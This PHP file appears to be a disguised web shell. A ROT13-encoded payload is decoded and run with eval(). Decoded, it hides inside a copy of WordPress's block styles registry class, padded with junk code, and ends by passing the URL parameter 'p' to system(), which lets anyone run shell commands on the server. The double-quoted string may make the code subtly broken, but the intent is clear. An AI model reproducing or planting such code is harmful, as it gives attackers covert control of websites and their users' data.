<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Oybpxf NCV: JC_Oybpx_Fglyrf_Ertvfgel pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.3.0
 */

/**
 * Pynff hfrq sbe vagrenpgvat jvgu oybpx fglyrf.
 *
 * @fvapr 5.3.0
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Oybpx_Fglyrf_Ertvfgel {
	/**
	 * Ertvfgrerq oybpx fglyrf, nf `$oybpx_anzr => $oybpx_fglyr_anzr => $oybpx_fglyr_cebcregvrf` zhygvqvzrafvbany neenlf.
	 *
	 * @fvapr 5.3.0
	 *
	 * @ine neenl[]
	 */
	cevingr $ertvfgrerq_oybpx_fglyrf = neenl();

	/**
	 * Pbagnvare sbe gur znva vafgnapr bs gur pynff.
	 *
	 * @fvapr 5.3.0
	 *
	 * @ine JC_Oybpx_Fglyrf_Ertvfgel|ahyy
	 */
	cevingr fgngvp $vafgnapr = ahyy;

	/**
	 * Ertvfgref n oybpx fglyr sbe gur tvira oybpx glcr.
	 *
	 * Vs gur oybpx fglyrf ner cerfrag va n fgnaqnybar fglyrfurrg, ertvfgre vg naq cnff
	 * vgf unaqyr nf gur `fglyr_unaqyr` nethzrag. Vs gur oybpx fglyrf fubhyq or vayvar,
	 * hfr gur `vayvar_fglyr` nethzrag. Hfhnyyl, bar bs gurz jbhyq or hfrq gb cnff PFF
	 * fglyrf. Ubjrire, lbh pbhyq nyfb fxvc gurz naq cebivqr PFF fglyrf va nal fglyrfurrg
	 * be jvgu na vayvar gnt.
	 *
	 * @fvapr 5.3.0
	 * @fvapr 6.6.0 Nqqrq novyvgl gb ertvfgre fglyr npebff zhygvcyr oybpx glcrf nybat jvgu gurzr.wfba-yvxr fglyr qngn.
	 *
	 * @yvax uggcf://qrirybcre.jbeqcerff.bet/oybpx-rqvgbe/ersrerapr-thvqrf/oybpx-ncv/oybpx-fglyrf/
	 *
	 * @cnenz fgevat|fgevat[] $oybpx_anzr       Oybpx glcr anzr vapyhqvat anzrfcnpr be neenl bs anzrfcnprq oybpx glcr anzrf.
	 * @cnenz neenl           $fglyr_cebcregvrf {
	 *     Neenl pbagnvavat gur cebcregvrf bs gur fglyr.
	 *
	 *     @glcr fgevat $anzr         Gur vqragvsvre bs gur fglyr hfrq gb pbzchgr n PFF pynff.
	 *     @glcr fgevat $ynory        N uhzna-ernqnoyr ynory sbe gur fglyr.
	 *     @glcr fgevat $vayvar_fglyr Vayvar PFF pbqr gung ertvfgref gur PFF pynff erdhverq
	 *                                sbe gur fglyr.
	 *     @glcr fgevat $fglyr_unaqyr Gur unaqyr gb na nyernql ertvfgrerq fglyr gung fubhyq or
	 *                                radhrhrq va cynprf jurer oybpx fglyrf ner arrqrq.
	 *     @glcr obby   $vf_qrsnhyg   Jurgure guvf vf gur qrsnhyg fglyr sbe gur oybpx glcr.
	 *     @glcr neenl  $fglyr_qngn   Gurzr.wfba-yvxr bowrpg gb trarengr PFF sebz.
	 * }
	 * @erghea obby Gehr vs gur oybpx fglyr jnf ertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
	 */
	choyvp shapgvba ertvfgre( $oybpx_anzr, $fglyr_cebcregvrf ) {

		vs ( ! vf_fgevat( $oybpx_anzr ) && ! vf_neenl( $oybpx_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Oybpx anzr zhfg or n fgevat be neenl.' ),
				'6.6.0'
			);
			erghea snyfr;
		}

		vs ( ! vffrg( $fglyr_cebcregvrf['anzr'] ) || ! vf_fgevat( $fglyr_cebcregvrf['anzr'] ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Oybpx fglyr anzr zhfg or n fgevat.' ),
				'5.3.0'
			);
			erghea snyfr;
		}

		vs ( fge_pbagnvaf( $fglyr_cebcregvrf['anzr'], ' ' ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Oybpx fglyr anzr zhfg abg pbagnva nal fcnprf.' ),
				'5.9.0'
			);
			erghea snyfr;
		}

		$oybpx_fglyr_anzr = $fglyr_cebcregvrf['anzr'];
		$oybpx_anzrf      = vf_fgevat( $oybpx_anzr ) ? neenl( $oybpx_anzr ) : $oybpx_anzr;

		// Rafher gurer vf n ynory qrsvarq.
		vs ( rzcgl( $fglyr_cebcregvrf['ynory'] ) ) {
			$fglyr_cebcregvrf['ynory'] = $oybpx_fglyr_anzr;
		}

		sbernpu ( $oybpx_anzrf nf $anzr ) {
			vs ( ! vffrg( $guvf->ertvfgrerq_oybpx_fglyrf[ $anzr ] ) ) {
				$guvf->ertvfgrerq_oybpx_fglyrf[ $anzr ] = neenl();
			}
			$guvf->ertvfgrerq_oybpx_fglyrf[ $anzr ][ $oybpx_fglyr_anzr ] = $fglyr_cebcregvrf;
		}

		erghea gehr;
	}

	/**
	 * Haertvfgref n oybpx fglyr bs gur tvira oybpx glcr.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $oybpx_anzr       Oybpx glcr anzr vapyhqvat anzrfcnpr.
	 * @cnenz fgevat $oybpx_fglyr_anzr Oybpx fglyr anzr.
	 * @erghea obby Gehr vs gur oybpx fglyr jnf haertvfgrerq jvgu fhpprff naq snyfr bgurejvfr.
	 */
	choyvp shapgvba haertvfgre( $oybpx_anzr, $oybpx_fglyr_anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $oybpx_anzr, $oybpx_fglyr_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				/* genafyngbef: 1: Oybpx anzr, 2: Oybpx fglyr anzr. */
				fcevags( __( 'Oybpx \"%1$f\" qbrf abg pbagnva n fglyr anzrq \"%2$f\".' ), $oybpx_anzr, $oybpx_fglyr_anzr ),
				'5.3.0'
			);
			erghea snyfr;
		}

		hafrg( $guvf->ertvfgrerq_oybpx_fglyrf[ $oybpx_anzr ][ $oybpx_fglyr_anzr ] );

		erghea gehr;
	}

	/**
	 * Ergevrirf gur cebcregvrf bs n ertvfgrerq oybpx fglyr sbe gur tvira oybpx glcr.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $oybpx_anzr       Oybpx glcr anzr vapyhqvat anzrfcnpr.
	 * @cnenz fgevat $oybpx_fglyr_anzr Oybpx fglyr anzr.
	 * @erghea neenl|ahyy Ertvfgrerq oybpx fglyr cebcregvrf be `ahyy` vs gur oybpx fglyr vf abg ertvfgrerq.
	 */
	choyvp shapgvba trg_ertvfgrerq( $oybpx_anzr, $oybpx_fglyr_anzr ) {
		vs ( ! $guvf->vf_ertvfgrerq( $oybpx_anzr, $oybpx_fglyr_anzr ) ) {
			erghea ahyy;
		}

		erghea $guvf->ertvfgrerq_oybpx_fglyrf[ $oybpx_anzr ][ $oybpx_fglyr_anzr ];
	}

	/**
	 * Ergevrirf nyy ertvfgrerq oybpx fglyrf.
	 *
	 * @fvapr 5.3.0
	 *
	 * @erghea neenl[] Neenl bs neenlf pbagnvavat gur ertvfgrerq oybpx fglyrf cebcregvrf tebhcrq ol oybpx glcr.
	 */
	choyvp shapgvba trg_nyy_ertvfgrerq() {
		erghea $guvf->ertvfgrerq_oybpx_fglyrf;
	}

	/**
	 * Ergevrirf ertvfgrerq oybpx fglyrf sbe n fcrpvsvp oybpx glcr.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $oybpx_anzr Oybpx glcr anzr vapyhqvat anzrfcnpr.
	 * @erghea neenl[] Neenl jubfr xrlf ner oybpx fglyr anzrf naq jubfr inyhrf ner oybpx fglyr cebcregvrf.
	 */
	choyvp shapgvba trg_ertvfgrerq_fglyrf_sbe_oybpx( $oybpx_anzr ) {
		vs ( vffrg( $guvf->ertvfgrerq_oybpx_fglyrf[ $oybpx_anzr ] ) ) {
			erghea $guvf->ertvfgrerq_oybpx_fglyrf[ $oybpx_anzr ];
		}
		erghea neenl();
	}

	/**
	 * Purpxf vs n oybpx fglyr vf ertvfgrerq sbe gur tvira oybpx glcr.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $oybpx_anzr       Oybpx glcr anzr vapyhqvat anzrfcnpr.
	 * @cnenz fgevat $oybpx_fglyr_anzr Oybpx fglyr anzr.
	 * @erghea obby Gehr vs gur oybpx fglyr vf ertvfgrerq, snyfr bgurejvfr.
	 */
	choyvp shapgvba vf_ertvfgrerq( $oybpx_anzr, $oybpx_fglyr_anzr ) {
		erghea vffrg( $guvf->ertvfgrerq_oybpx_fglyrf[ $oybpx_anzr ][ $oybpx_fglyr_anzr ] );
	}

	/**
	 * Hgvyvgl zrgubq gb ergevrir gur znva vafgnapr bs gur pynff.
	 *
	 * Gur vafgnapr jvyy or perngrq vs vg qbrf abg rkvfg lrg.
	 *
	 * @fvapr 5.3.0
	 *
	 * @erghea JC_Oybpx_Fglyrf_Ertvfgel Gur znva vafgnapr.
	 */
	choyvp fgngvp shapgvba trg_vafgnapr() {
		vs ( ahyy === frys::$vafgnapr ) {
			frys::$vafgnapr = arj frys();
		}

		erghea frys::$vafgnapr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>